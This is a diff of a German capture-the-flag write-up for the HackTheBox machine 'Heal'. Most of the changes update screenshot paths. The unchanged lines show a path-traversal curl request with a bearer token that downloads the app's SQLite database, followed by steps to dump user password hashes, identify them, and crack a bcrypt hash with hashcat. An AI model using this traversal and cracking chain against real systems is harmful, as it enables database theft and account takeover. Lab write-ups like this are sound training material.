@@ -12,24 +12,24 @@
 2. ```/storage/development.sqlite3```
    - Wenn über Burp angefragt, dann bekommt man nur die binary ```.sqlite3``` Datei
 
-![sqlite-binary.png](../../../screenshots/sqlite-binary.png)
+![sqlite-binary.png](../../../screenshots/sqlite-burp.png)
 
 3. Mit ```curl``` die Datei in geeignetem Format herunterladen
 
-![development-db.png](../../../screenshots/development-db.png)
+![development-db.png](../../../img/development-db.png)
 ```
 curl    -X GET "http://api.heal.htb/download?filename=../../storage/development.sqlite3" 
         -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo3fQ.bN47YVxPM1ZVqbw4J7oHZeDc3ixY3KO6yZpM5M3nfZE" 
         -o development-db.csv
 ```
 ### DB Structure
-![db-structure.png](../../../screenshots/db-structure.png)
+![db-structure.png](../../../img/db-structure.png)
 
 ### DB Users
 - Alle User aus der DB bekommen
 - Passwort Hashes bekommen
 
-![img_1.png](../../../screenshots/user-db.png)
+![img_1.png](../../../img/user-db.png)
 ```
 [
   {
@@ -136,7 +136,7 @@ Jetzt habe ich die Hash Werte der User Passwörter
 #### 1. hash-identifier
 - Liefert mir kein Ergebnis
 
-![img.png](../../../screenshots/hash-identifier.png)
+![img.png](../../../img/hash-identifier.png)
 
 #### 2. hashid
 - Sagt, dass der verwendete Hashalgorithmus einer der Drei ist:
@@ -144,12 +144,12 @@ Jetzt habe ich die Hash Werte der User Passwörter
   2. Woltlab Burning Board 4.x
   3. bcrypt
 
-![img.png](../../../screenshots/hashid.png)
+![img.png](../../../img/hashid.png)
 ---
 
 #### 3. Hashcat
 
-![img.png](../../../screenshots/hashcat.png)
+![img.png](../../../img/hashcat.png)
 ```
 hashcat -m 3200 
         pw-hashes.txt 
@@ -162,7 +162,7 @@ hashcat
         wordlist
 ```
 
-![img.png](../../../screenshots/hashcat-password-antony.png)
+![img.png](../../../img/hashcat-password-ralph.png)
 ```
 ralph@heal.htb:
 Hash:       $2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
